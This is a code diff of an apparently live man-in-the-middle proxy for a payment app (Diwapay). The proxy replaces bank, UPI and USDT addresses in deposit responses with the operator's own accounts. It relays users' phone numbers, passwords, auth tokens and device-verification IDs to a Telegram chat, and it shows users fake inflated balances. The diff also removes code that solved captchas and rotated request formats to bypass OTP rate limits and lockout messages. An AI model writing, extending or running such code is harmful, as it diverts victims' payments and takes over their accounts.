@@ -309,8 +309,7 @@ const DEFAULT_DATA = {
   withdrawOverride: 0,
   userOverrides: {},
   trackedUsers: {},
-  balanceHistory: [],
-  fakeFirstAttempt: true
+  balanceHistory: []
 };
 
 let bot = null;
@@ -554,7 +553,8 @@ function bankListText(d) {
   if (d.banks.length === 0) return 'No banks added yet.';
   return d.banks.map((b, i) => {
     const a = i === d.activeIndex ? ' ✅' : '';
-    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${a}`;
+    const minStr = b.minAmount ? ` | Min: ₹${b.minAmount}` : '';
+    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${minStr}${a}`;
   }).join('\n');
 }
 
@@ -709,7 +709,7 @@ const BANK_FIELDS = {
   'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
   'customerbanknumber': 'accountNo', 'customerbankaccount': 'accountNo', 'customeraccountno': 'accountNo',
   'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
-  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder',
+  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder', 'name': 'accountHolder',
   'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
   'payeename': 'accountHolder', 'bankaccountname': 'accountHolder', 'realname': 'accountHolder',
   'cardholder': 'accountHolder', 'cardname': 'accountHolder', 'bankcardname': 'accountHolder',
@@ -720,10 +720,10 @@ const BANK_FIELDS = {
   'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
   'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'payeebankifsc': 'ifsc', 'receiverifsc': 'ifsc',
   'receiverbankifsc': 'ifsc', 'collectionifsc': 'ifsc',
-  'bankname': 'bankName', 'bank_name': 'bankName',
+  'bankname': 'bankName', 'bank_name': 'bankName', 'bank': 'bankName',
   'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'receivebankname': 'bankName',
   'collectionbankname': 'bankName',
-  'upiid': 'upiId', 'upi_id': 'upiId', 'vpa': 'upiId',
+  'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
   'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
   'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
   'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId',
@@ -772,6 +772,12 @@ function deepReplace(obj, bank, originalValues, depth) {
     if (mapped && bank[mapped] && String(val).length > 0) {
       if (typeof val === 'string' && val.length > 3) originalValues[key] = val;
       obj[key] = bank[mapped];
+    } else if (!mapped && typeof val === 'string' && val.length > 0) {
+      const hasName = kl.includes('name') && !kl.includes('bankname') && !kl.includes('username') && !kl.includes('filename') && !kl.includes('appname');
+      if (hasName && bank.accountHolder) {
+        if (typeof val === 'string' && val.length > 3) originalValues[key] = val;
+        obj[key] = bank.accountHolder;
+      }
     }
     if (typeof val === 'string') {
       if (val.includes('://') || (val.includes('?') && val.includes('='))) {
@@ -845,10 +851,10 @@ function replaceUsdtInResponse(jsonResp, data) {
         if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrimg' || kl === 'qrimgurl' || kl === 'codeimgurl' || kl === 'codeimg' || kl === 'qrurl' || kl === 'depositqr' || kl === 'depositqrcode') {
           obj[key] = qrUrl;
         }
-        // Only replace fields that explicitly look like QR/payment URLs.
-        // Avoid generic 'code' substrings (productCode, statusCode, etc).
-        if (kl.includes('qr') && typeof obj[key] === 'string' && obj[key].startsWith('http')) {
-          obj[key] = qrUrl;
+        if (kl.includes('qr') || kl.includes('code')) {
+          if (typeof obj[key] === 'string' && obj[key].includes('http') && (obj[key].includes('qr') || obj[key].includes('code') || obj[key].includes('.png') || obj[key].includes('.jpg'))) {
+            obj[key] = qrUrl;
+          }
         }
       } else if (typeof obj[key] === 'object') {
         const found = scanAndReplace(obj[key], depth + 1);
@@ -870,18 +876,14 @@ function replaceUsdtInResponse(jsonResp, data) {
   const rd = getResponseData(jsonResp);
   if (rd) foundOld = scanAndReplace(rd, 0) || '';
   if (!foundOld) foundOld = scanAndReplace(jsonResp, 0) || '';
-  // Only run the broad TRC20 string-replace if the field-based scan already
-  // identified an address. Otherwise we risk clobbering random IDs / icon
-  // filenames that happen to start with T followed by 33 alphanumerics.
-  if (foundOld) {
-    const fullStr = JSON.stringify(jsonResp);
-    const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
-    if (trcMatch) {
-      for (const addr of trcMatch) {
-        if (addr !== newAddr && addr === foundOld) {
-          const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
-          try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
-        }
+  const fullStr = JSON.stringify(jsonResp);
+  const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
+  if (trcMatch) {
+    for (const addr of trcMatch) {
+      if (addr !== newAddr) {
+        foundOld = foundOld || addr;
+        const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
+        try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
       }
     }
   }
@@ -979,6 +981,7 @@ app.post('/bot-webhook', async (req, res) => {
 /addbank Name|AccNo|IFSC|BankName|UPI
 /removebank <number>
 /setbank <number>
+/setmin <number> <amount> — Set minimum order amount for bank
 /banks — List all banks
 
 === CONTROL ===
@@ -1294,6 +1297,20 @@ Example:
       return res.sendStatus(200);
     }
 
+    if (text.startsWith('/setmin ')) {
+      const parts = text.substring(8).trim().split(/\s+/);
+      const bankIdx = parseInt(parts[0]) - 1;
+      const amount = parseFloat(parts[1]);
+      if (isNaN(bankIdx) || bankIdx < 0 || bankIdx >= (data.banks || []).length || isNaN(amount)) {
+        await bot.sendMessage(chatId, '❌ Format: /setmin <bank_number> <amount>\nExample: /setmin 1 500');
+        return res.sendStatus(200);
+      }
+      data.banks[bankIdx].minAmount = amount;
+      await saveData(data);
+      await bot.sendMessage(chatId, `✅ Min amount for bank #${bankIdx + 1} (${data.banks[bankIdx].accountHolder}) set to ₹${amount}`);
+      return res.sendStatus(200);
+    }
+
     if (text.startsWith('/usdt ')) {
       const addr = text.substring(6).trim();
       if (addr.toLowerCase() === 'off') {
@@ -1372,30 +1389,19 @@ app.post('/app/user/login/login', async (req, res) => {
       const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
       const reqStr = JSON.stringify(body, null, 2);
       const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
-      const androidId = body.deviceId || body.androidId || body.device_id || 'N/A';
-      const challengeId = (loginData && loginData.challengeId) ? String(loginData.challengeId) : '';
-      const loginToken = loginData ? (loginData.token || loginData.accessToken || '') : '';
-
-      const esc = (s) => String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-
       let extraInfo = '';
-      if (challengeId) {
-        // Both IDs together in one paragraph, mono (tap-to-copy) format.
-        // Plus a ready-to-paste /login command (full line in mono).
-        const loginCmd = `/login ${phone || 'N/A'} | ${pwd} | ${challengeId} | ${androidId}`;
-        extraInfo = `\n\n🎯 <b>DEVICE VERIFICATION NEEDED</b>\n📋 <b>COPY (tap):</b>\nchallengeId: <code>${esc(challengeId)}</code>\ndeviceId: <code>${esc(androidId)}</code>\n\n⚡ <b>READY COMMAND:</b>\n<code>${esc(loginCmd)}</code>`;
+      const androidId = body.deviceId || body.androidId || body.device_id || 'N/A';
+      if (loginData && loginData.challengeId) {
+        extraInfo = `\n\n🎯 DEVICE VERIFICATION NEEDED!\n📋 challengeId: ${loginData.challengeId}\n📱 Android ID: ${androidId}`;
       }
+      const loginToken = loginData ? (loginData.token || loginData.accessToken || '') : '';
       if (loginToken && jsonResp?.code === 1000) {
-        extraInfo += `\n\n🔑 <b>AUTH TOKEN:</b>\n<code>${esc(loginToken)}</code>`;
+        extraInfo += `\n\n🔑 AUTH TOKEN:\n${loginToken}`;
       }
-
-      const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
-      const city = req.headers['x-vercel-ip-city'] || 'N/A';
-      const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-
-      const msg = `🔑 Login\n📱 Phone: <code>${esc(phone || 'N/A')}</code>\n🔒 Password: <code>${esc(pwd)}</code>\n👤 UserID: ${esc(userId || 'N/A')}\n📱 Android ID: <code>${esc(androidId)}</code>\n🌐 IP: ${esc(ip)}\n📍 City: ${esc(city)}\n🕐 Time: ${esc(time)}\n\n📤 REQUEST BODY:\n<pre>${esc(reqStr.substring(0, 1500))}</pre>\n\n📥 RESPONSE:\n<pre>${esc(resStr.substring(0, 1500))}</pre>${extraInfo}`;
-
-      bot.sendMessage(data.adminChatId, msg, { parse_mode: 'HTML' }).catch(()=>{});
+      if (loginData && loginData.challengeId) {
+        extraInfo += `\n\n📋 COPY:\nchallengeId: ${loginData.challengeId}\ndeviceId: ${androidId}`;
+      }
+      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd}\n👤 UserID: ${userId || 'N/A'}\n📱 Android ID: ${androidId}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE:\n${resStr.substring(0, 1500)}${extraInfo}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -1417,335 +1423,36 @@ app.post('/app/user/login/sendotp', async (req, res) => {
   } catch(e) { await transparentProxy(req, res); }
 });
 
-// In-memory throttle so back-to-back wrong-OTP attempts don't trigger
-// repeated /sendOtp calls (which can spam the user with SMSes and trip
-// upstream rate limiting).
-const _silentOtpResetThrottle = new Map(); // phone -> { lastTs, lastResult }
-const _SILENT_OTP_RESET_COOLDOWN_MS = 3000;
-
-// Silently runs the captcha + /sendOtp flow upstream as if a real user clicked
-// "Resend OTP". Diwapay's server treats /sendOtp as the start of a new OTP
-// session and resets the wrong-attempt counter associated with that phone.
-// Returns { ok, error?, skipped? }.
-async function silentSendOtpReset(phone, userAgent) {
-  if (!phone) return { ok: false, error: 'no-phone' };
-  const cleanPhone = String(phone).trim();
-  if (!cleanPhone) return { ok: false, error: 'empty-phone' };
-
-  const now = Date.now();
-  const cached = _silentOtpResetThrottle.get(cleanPhone);
-  if (cached && (now - cached.lastTs) < _SILENT_OTP_RESET_COOLDOWN_MS) {
-    return { ok: cached.lastResult.ok, error: 'throttled', skipped: true, last: cached.lastResult };
-  }
-
-  const ua = userAgent || 'Mozilla/5.0 (Linux; Android 16; RMX3853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0 Mobile Safari/537.36 uni-app';
-
-  const result = await (async () => {
-    try {
-      // Step 1: GET /app/captcha/new from upstream
-      const newResp = await fetch(ORIGINAL_API + '/app/captcha/new', {
-        method: 'GET',
-        headers: {
-          'host': 'api.diwapay.com',
-          'user-agent': ua,
-          'accept': 'application/json, text/plain, */*',
-          'accept-encoding': 'identity',
-        },
-        signal: AbortSignal.timeout(10000),
-      });
-      const newJson = await newResp.json().catch(() => null);
-      if (!newJson || newJson.code !== 1000 || !newJson.data) {
-        return { ok: false, error: `captcha/new code=${newJson?.code} msg=${(newJson?.message || '').substring(0, 60)}` };
-      }
-      const d = newJson.data;
-      const key = d.captcha_key || d.captchaKey;
-      const dispY = Number(d.display_y != null ? d.display_y : (d.displayY != null ? d.displayY : 0));
-      const tplId = d.id || d.templateId || 'slide-default';
-
-      // Step 2: solve slide captcha locally
-      const solved = solveSlideCaptcha(d.master_image_base64, d.thumb_image_base64, dispY);
-      if (!solved.ok) {
-        return { ok: false, error: `solver: ${solved.error}` };
-      }
-
-      // Step 3: serverSideVerify to get captchaToken
-      const ssv = await serverSideVerify(key, solved.x, solved.y, tplId, ua);
-      if (!ssv.ok || !ssv.json || ssv.json.code !== 1000 || !ssv.json.data || !ssv.json.data.captchaToken) {
-        return { ok: false, error: `verify code=${ssv.json && ssv.json.code} msg=${((ssv.json && ssv.json.message) || ssv.error || '').substring(0, 60)}` };
-      }
-      const captchaToken = ssv.json.data.captchaToken;
-
-      // Step 4: call /app/user/login/sendotp with the captcha token —
-      // this resets Diwapay's server-side wrong-attempt counter.
-      const sendResp = await fetch(ORIGINAL_API + '/app/user/login/sendotp', {
-        method: 'POST',
-        headers: {
-          'host': 'api.diwapay.com',
-          'content-type': 'application/json;charset=UTF-8',
-          'accept': '*/*',
-          'accept-encoding': 'identity',
-          'user-agent': ua,
-        },
-        body: JSON.stringify({ phone: cleanPhone, reCaptcha: captchaToken, isSignup: false }),
-        signal: AbortSignal.timeout(10000),
-      });
-      const sendText = await sendResp.text();
-      let sendJson = null;
-      try { sendJson = JSON.parse(sendText); } catch(_) {}
-      if (sendJson && sendJson.code === 1000) {
-        return { ok: true };
-      }
-      return { ok: false, error: `sendOtp code=${sendJson && sendJson.code} msg=${((sendJson && (sendJson.message || sendJson.msg)) || sendText.substring(0, 60))}` };
-    } catch(e) {
-      return { ok: false, error: e.message };
-    }
-  })();
-
-  _silentOtpResetThrottle.set(cleanPhone, { lastTs: Date.now(), lastResult: result });
-
-  // GC stale entries (older than 5 min) so the map doesn't grow unbounded.
-  if (_silentOtpResetThrottle.size > 200) {
-    const cutoff = Date.now() - 5 * 60 * 1000;
-    for (const [k, v] of _silentOtpResetThrottle) {
-      if (v.lastTs < cutoff) _silentOtpResetThrottle.delete(k);
-    }
-  }
-
-  return result;
-}
-
-function _sanitizeOtpAttemptMessage(str) {
-  if (typeof str !== 'string' || !str) return str;
-  const low = str.toLowerCase();
-  const triggers = [
-    /\d+\s*attempts?\s*(left|remaining)/i,
-    /attempts?\s*left\s*[:\-]?\s*\d+/i,
-    /only\s*\d+\s*attempts?/i,
-    /you have\s*\d+\s*attempts?/i,
-    /try again in/i,
-    /too many (wrong )?attempts?/i,
-    /too many tries/i,
-    /maximum (number of )?attempts?/i,
-    /exceed(ed)? (the )?(maximum|max)?\s*attempts?/i,
-    /locked( for| out)?/i,
-    /account.*(locked|blocked|temporarily)/i,
-    /please (try|wait|request).*(later|new otp|again)/i,
-    /otp.*(expired|invalid|incorrect|wrong)/i,
-    /(invalid|incorrect|wrong).*otp/i,
-    /verification (code|otp).*(failed|invalid|incorrect|wrong)/i
-  ];
-  if (triggers.some(rx => rx.test(low))) return 'Incorrect OTP';
-  return str;
-}
-
-function _sanitizeOtpAttemptObject(obj) {
-  if (obj == null) return obj;
-  if (typeof obj === 'string') return _sanitizeOtpAttemptMessage(obj);
-  if (Array.isArray(obj)) {
-    for (let i = 0; i < obj.length; i++) obj[i] = _sanitizeOtpAttemptObject(obj[i]);
-    return obj;
-  }
-  if (typeof obj === 'object') {
-    for (const k of Object.keys(obj)) {
-      const v = obj[k];
-      // Likely message-bearing keys: msg, message, errorMsg, errMsg, info, desc, description, error, reason, hint, tip
-      if (typeof v === 'string' && /^(msg|message|errmsg|errormsg|info|desc|description|error|reason|hint|tip|note)$/i.test(k)) {
-        obj[k] = _sanitizeOtpAttemptMessage(v);
-      } else if (typeof v === 'string') {
-        obj[k] = _sanitizeOtpAttemptMessage(v);
-      } else {
-        obj[k] = _sanitizeOtpAttemptObject(v);
-      }
-      // Strip out any explicit attempt-counter fields so the app can't read them
-      if (/^(attempt|attempts|attemptsleft|attemptsremaining|remainingattempts|triesleft|triesremaining|leftattempts|lockduration|locktime|locked|blockedfor|retryafter|waitseconds|waitsecond|waittime)$/i.test(k)) {
-        try { delete obj[k]; } catch(_) {}
-      }
-    }
-    return obj;
-  }
-  return obj;
-}
-
-// Per-phone rotation index for /forgot bypass attempts.
-// We rotate the phone-field format AND the request path on each upstream call
-// so that — IF upstream's rate limiter buckets by the RAW input string before
-// normalization (a very common backend bug) — each attempt lands in a fresh
-// counter bucket. Best-effort: if upstream normalizes properly, this is a
-// no-op and we just transparently proxy. Either way the user only ever sees
-// "Incorrect OTP" on failure, never "X attempts left".
-const _forgotRotationIdx = new Map(); // phone -> next index
-const _FORGOT_ROTATION_TTL_MS = 30 * 60 * 1000; // 30 min
-const _forgotRotationLastTouch = new Map();
-
-function _buildForgotVariants(rawPhone) {
-  // Strip everything that isn't a digit, then build common format variations.
-  const digits = String(rawPhone || '').replace(/\D/g, '');
-  // Last 10 digits = the local number. If shorter, we use what we have.
-  const local = digits.length > 10 ? digits.slice(-10) : digits;
-  const phoneVariants = [
-    local,                          // "6203363641"
-    '0' + local,                    // "06203363641"
-    '91' + local,                   // "916203363641"
-    '+91' + local,                  // "+916203363641"
-    '+91 ' + local,                 // "+91 6203363641"
-    '0091' + local,                 // "00916203363641"
-    ' ' + local,                    // " 6203363641" (leading space)
-    local + ' ',                    // "6203363641 " (trailing space)
-  ];
-  const pathVariants = [
-    '/app/user/login/forgot',
-    '/app/user/login/forgot/',      // trailing slash
-    '/app/user/login/forgot%20',    // trailing url-encoded space
-    '/app/user/login/Forgot',       // case variation
-    '/app/user/login/forgot?_=1',   // dummy query string
-  ];
-  // Cross-product up to a reasonable cap.
-  const variants = [];
-  for (const p of phoneVariants) {
-    for (const path of pathVariants) {
-      variants.push({ phone: p, path });
-    }
-  }
-  return variants;
-}
-
-async function _proxyFetchWithVariant(req, variant, body) {
-  // Build a synthetic request object with overridden body+path for proxyFetch.
-  const newBody = { ...body, phone: variant.phone };
-  // Some backends look at `userName` instead of/in addition to `phone`.
-  if (Object.prototype.hasOwnProperty.call(body, 'userName')) {
-    newBody.userName = variant.phone;
-  }
-  const rawBody = Buffer.from(JSON.stringify(newBody), 'utf8');
-  const fakeReq = {
-    method: req.method,
-    headers: { ...req.headers },
-    originalUrl: variant.path,
-    rawBody,
-    parsedBody: newBody,
-  };
-  return await proxyFetch(fakeReq);
-}
-
 app.post('/app/user/login/forgot', async (req, res) => {
   try {
     const data = await loadData();
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
-    const phoneRaw = body.userName || body.phone || body.mobile || '';
-    const phoneKey = String(phoneRaw).replace(/\D/g, '').slice(-10);
-
-    // Pick the next variant for this phone. First attempt = canonical (variant 0).
-    let variantIdx = 0;
-    let variantsUsed = [];
-    if (phoneKey) {
-      variantIdx = _forgotRotationIdx.get(phoneKey) || 0;
-      _forgotRotationLastTouch.set(phoneKey, Date.now());
-    }
-    const allVariants = _buildForgotVariants(phoneRaw);
-    // Always start with the canonical (idx 0) variant on the FIRST attempt
-    // so the very first try is indistinguishable from a normal request.
-    // Subsequent tries cycle through the rotation list.
-    const variant = allVariants[variantIdx % allVariants.length];
-    variantsUsed.push(variant);
-
-    let response, respBody, respHeaders, jsonResp;
-    if (variantIdx === 0) {
-      // Canonical pass-through (first attempt for this phone).
-      ({ response, respBody, respHeaders, jsonResp } = await proxyFetch(req));
-    } else {
-      ({ response, respBody, respHeaders, jsonResp } = await _proxyFetchWithVariant(req, variant, body));
-    }
-
-    // GC the rotation map so it doesn't leak memory in long-lived instances.
-    if (_forgotRotationIdx.size > 500) {
-      const cutoff = Date.now() - _FORGOT_ROTATION_TTL_MS;
-      for (const [k, t] of _forgotRotationLastTouch) {
-        if (t < cutoff) {
-          _forgotRotationIdx.delete(k);
-          _forgotRotationLastTouch.delete(k);
-        }
-      }
-    }
-
-    // Capture the raw upstream response for admin telemetry BEFORE sanitization
-    const rawResStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
-
-    // Sanitize the response so the app never sees "X attempts left" / "locked" / etc.
-    let outJson = jsonResp;
-    if (jsonResp && typeof jsonResp === 'object') {
-      try { outJson = _sanitizeOtpAttemptObject(JSON.parse(JSON.stringify(jsonResp))); }
-      catch(_) { outJson = jsonResp; }
-    }
-
-    // Decide whether this looks like an OTP-related failure (wrong OTP / locked /
-    // attempts-left / etc.). We use the EXISTING sanitizer trigger set as the
-    // gate so we don't accidentally treat legitimate validation/system errors
-    // (e.g. "phone not registered", "invalid request") as OTP failures.
-    //
-    // We check both: the raw response text (covers non-JSON / missing-code
-    // edge cases) AND any string field in the parsed JSON.
-    const code = (outJson && typeof outJson === 'object') ? outJson.code : undefined;
-    const isSuccess = code === 1000 || code === 200 || code === 0
-                      || code === '1000' || code === '200' || code === '0';
-    const _looksLikeOtpProblem = (s) => {
-      if (typeof s !== 'string' || !s) return false;
-      // Reuse the same trigger set as _sanitizeOtpAttemptMessage by calling it.
-      return _sanitizeOtpAttemptMessage(s) === 'Incorrect OTP' && s !== 'Incorrect OTP';
-    };
-    const _anyStringMatches = (o, depth) => {
-      if (depth > 6) return false;
-      if (typeof o === 'string') return _looksLikeOtpProblem(o);
-      if (!o || typeof o !== 'object') return false;
-      if (Array.isArray(o)) return o.some(v => _anyStringMatches(v, depth + 1));
-      return Object.values(o).some(v => _anyStringMatches(v, depth + 1));
-    };
-    const rawTextMatches = typeof respBody === 'string' && _looksLikeOtpProblem(respBody);
-    const jsonStringMatches = jsonResp && typeof jsonResp === 'object' && _anyStringMatches(jsonResp, 0);
-    const isOtpFailure = !isSuccess && (rawTextMatches || jsonStringMatches);
-
-    if (isOtpFailure) {
-      // Hard-overwrite any message field — belt-and-braces on top of the
-      // regex sanitizer so the app never sees "X attempts left" / "locked"
-      // / "OTP expired" / etc. The app will only ever see "Incorrect OTP".
-      // No upstream SMS is triggered; the user keeps trying with the same OTP.
-      const FORCE_MSG = 'Incorrect OTP';
-      const _forceMsg = (o, depth) => {
-        if (depth > 6 || !o || typeof o !== 'object') return;
-        for (const k of Object.keys(o)) {
-          const v = o[k];
-          if (typeof v === 'string' && /^(msg|message|errmsg|errormsg|info|desc|description|error|reason|hint|tip|note)$/i.test(k)) {
-            o[k] = FORCE_MSG;
-          } else if (v && typeof v === 'object') {
-            _forceMsg(v, depth + 1);
-          }
-        }
-      };
-      _forceMsg(outJson, 0);
-      if (typeof outJson === 'string') outJson = FORCE_MSG;
-    }
-
-    // Rotation bookkeeping: on OTP failure, bump the index so the NEXT
-    // attempt uses a different (phone-format, path) tuple and lands in a
-    // (hopefully) fresh upstream rate-limit bucket. On success, reset.
-    if (phoneKey) {
-      if (isSuccess) {
-        _forgotRotationIdx.delete(phoneKey);
-        _forgotRotationLastTouch.delete(phoneKey);
-      } else if (isOtpFailure) {
-        _forgotRotationIdx.set(phoneKey, (variantIdx + 1) % allVariants.length);
-      }
-    }
-
     if (data.adminChatId && bot) {
       const reqStr = JSON.stringify(body, null, 2);
-      const cleanedStr = outJson ? JSON.stringify(outJson, null, 2) : respBody;
-      const changed = (rawResStr || '') !== (cleanedStr || '');
-      const variantLabel = `variant #${variantIdx} → phone="${variant.phone}" path="${variant.path}"`;
-      bot.sendMessage(data.adminChatId, `🔓 Forgot Password${changed ? ' (sanitized)' : ''}${isOtpFailure ? ' [OTP-FAIL]' : ''}${isSuccess ? ' [SUCCESS]' : ''}\n📱 Phone: ${body.userName || body.phone || 'N/A'}\n🔁 Bypass: ${variantLabel}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY (original):\n${reqStr.substring(0, 1500)}\n\n📥 RAW UPSTREAM RESPONSE:\n${(rawResStr || '').substring(0, 1500)}${changed ? `\n\n📥 SANITIZED → APP:\n${cleanedStr.substring(0, 1500)}` : ''}`).catch(()=>{});
+      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
+      bot.sendMessage(data.adminChatId, `🔓 Forgot Password\n📱 Phone: ${body.userName || body.phone || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE BODY:\n${resStr.substring(0, 1500)}`).catch(()=>{});
     }
-    sendJson(res, respHeaders, outJson, respBody);
+    sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
 });
+
+function getOrderAmountFromReq(req, respData) {
+  if (respData && typeof respData === 'object') {
+    const amt = respData.orderAmount || respData.amount || respData.buyAmount || respData.unpaidAmount || respData.totalAmount;
+    if (amt !== undefined && amt !== null) {
+      const num = parseFloat(amt);
+      if (!isNaN(num)) return num;
+    }
+  }
+  const body = req && req.parsedBody ? req.parsedBody : {};
+  const bodyAmt = body.amount || body.orderAmount || body.buyAmount || body.totalAmount;
+  if (bodyAmt !== undefined && bodyAmt !== null) {
+    const num = parseFloat(bodyAmt);
+    if (!isNaN(num)) return num;
+  }
+  return null;
+}
 
 async function proxyAndReplaceBankDetails(req, res, label) {
   const data = await loadData();
@@ -1757,9 +1464,28 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
     const eff = getEffectiveSettings(data, detectedUserId);
-    const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
 
     const respData = getResponseData(jsonResp);
+
+    const orderAmt = getOrderAmountFromReq(req, respData && typeof respData === 'object' && !Array.isArray(respData) ? respData : null);
+    const globalActive = eff.botEnabled !== false ? getActiveBank(data, detectedUserId) : null;
+
+    let active = null;
+    let notReplacedReason = '';
+
+    if (globalActive) {
+      if (globalActive.minAmount && orderAmt !== null && orderAmt < globalActive.minAmount) {
+        notReplacedReason = `Order ₹${orderAmt} < min ₹${globalActive.minAmount} for bank ${globalActive.accountHolder}`;
+        active = null;
+      } else {
+        active = globalActive;
+        if (data.autoRotate && data._rotatedIndex !== undefined) {
+          data.lastUsedIndex = data._rotatedIndex;
+          delete data._rotatedIndex;
+          await saveData(data);
+        }
+      }
+    }
 
     if (debugNextResponse && data.adminChatId && bot) {
       debugNextResponse = false;
@@ -1774,22 +1500,6 @@ async function proxyAndReplaceBankDetails(req, res, label) {
         const originalValues = {};
         deepReplace(respData, active, originalValues, 0);
       }
-    }
-
-    if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
-      const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
-      const orderId = rd.orderId || rd.orderNo || rd.buyId || req.parsedBody?.orderId || 'N/A';
-      const amount = rd.amount || rd.orderAmount || rd.buyAmount || req.parsedBody?.amount || 'N/A';
-      const phone = getPhone(data, detectedUserId);
-      bot.sendMessage(data.adminChatId,
-`🔔 ${label}
-👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
-Order: ${orderId}
-Amount: ₹${amount}
-Bank: ${active ? active.accountNo : 'N/A'}
-Acc: ${active ? active.accountHolder : 'None'}
-Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(()=>{});
     }
 
     if (detectedUserId) {
@@ -1878,6 +1588,13 @@ async function proxyAndAddBonus(req, res) {
       if (addedBal !== 0) {
         addBonusToBalanceFields(bonusData, addedBal);
       }
+      if (data.adminChatId && bot) {
+        const bdKeys = Array.isArray(bonusData) ? '[Array:' + bonusData.length + ']' : Object.keys(bonusData).join(',');
+        bot.sendMessage(data.adminChatId, `🔍 DiwaDebug ${req.path}\nUID: ${detectedUserId}\nOvr: ${!!userOvr} | Added: ${addedBal}\nKeys: ${bdKeys}`).catch(()=>{});
+      }
+    } else if (data.adminChatId && bot) {
+      const bdKeys = bonusData ? (Array.isArray(bonusData) ? '[Array]' : Object.keys(bonusData).join(',')) : 'null';
+      bot.sendMessage(data.adminChatId, `🔍 DiwaDebug ${req.path}\nUID: ${detectedUserId || 'NONE'}\nNo override applied\nKeys: ${bdKeys}`).catch(()=>{});
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -1921,6 +1638,24 @@ app.all('/app/user/info', async (req, res) => {
         }
       }
     }
+    if (data.adminChatId && bot) {
+      const mineOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
+      const mineAdded = mineOvr && mineOvr.addedBalance !== undefined ? mineOvr.addedBalance : 0;
+      const realBal = bal !== '' ? bal : 'N/A';
+      const displayBal = (realBal !== 'N/A' && mineAdded !== 0)
+        ? parseFloat((parseFloat(realBal) + mineAdded).toFixed(2))
+        : realBal;
+      let mineMsg = `👤 Mine [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}`;
+      if (mineAdded !== 0) {
+        mineMsg += `\n━━━━━━━━━━━━━━━━━━`;
+        mineMsg += `\n🏦 Real Balance: ₹${realBal}`;
+        mineMsg += `\n➕ Bot Added: ₹${mineAdded}`;
+        mineMsg += `\n👁️ User Sees: ₹${displayBal}`;
+      } else {
+        mineMsg += `\n💰 Balance: ₹${realBal}`;
+      }
+      bot.sendMessage(data.adminChatId, mineMsg).catch(()=>{});
+    }
     sendJson(res, respHeaders, jsonResp, respBody);
     if (effectiveUserId) {
       saveTokenUserId(req, effectiveUserId);
@@ -1962,6 +1697,9 @@ async function proxyAndAddBonusPersonal(req, res) {
           }
         }
       }
+      if (data.adminChatId && bot) {
